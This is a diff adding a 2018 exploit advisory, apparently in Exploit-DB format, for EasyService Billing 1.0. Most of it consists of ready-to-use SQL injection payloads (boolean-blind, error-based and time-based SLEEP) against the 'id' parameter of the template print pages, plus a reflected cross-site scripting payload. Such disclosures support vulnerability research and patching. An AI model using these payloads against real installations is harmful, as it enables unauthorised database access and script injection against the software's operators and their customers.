@@ -1,0 +1,42 @@
+# Exploit Title: EasyService Billing 1.0 - 'template_().php' SQL Injection / Cross-Site Scripting
+# Dork: N/A
+# Date: 22.05.2018
+# Exploit Author: Özkan Mustafa Akkuş (AkkuS)
+# Vendor Homepage:
+https://codecanyon.net/item/easyservice-billing-php-scripts-for-quotation-invoice-payments-etc/16687594
+# Version: 1.0
+# Category: Webapps
+# Tested on: Kali linux
+# Description : all of the print and preview pages have the same vulnerabilities. (template_SBilling.php, template_Receipt.php, template_SBillingPerforma.php,template_SBillingQuotation.php)
+  All of them use the same parameters. An attacker can use any of these.
+====================================================
+
+# PoC : SQLi :
+
+Parameter : id
+
+     Type : boolean-based blind
+     Demo :
+http://test.com/EasyServiceBilling/print/template_SBilling.php?tid=3&id=145
+  Payload : tid=3&id=145' OR NOT 3938=3938#
+
+     Type : error-based
+     Demo :
+http://test.com/EasyServiceBilling/print/template_SBilling.php?tid=3&id=145
+  Payload : tid=3&id=145' AND (SELECT 7524 FROM(SELECT
+COUNT(*),CONCAT(0x7162707671,(SELECT
+(ELT(7524=7524,1))),0x71767a7171,FLOOR(RAND(0)*2))x FROM
+INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- UjGj
+
+     Type : AND/OR time-based blind
+     Demo :
+http://test.com/EasyServiceBilling/print/template_SBilling.php?tid=3&id=145
+  Payload : tid=3&id=145' AND SLEEP(5)-- USaG
+
+
+====================================================
+# PoC : XSS :
+
+  Payload :
+http://test.com/EasyServiceBilling/print/template_SBilling.php?tid=3&id='
+</script><script>alert(1)</script>‘;
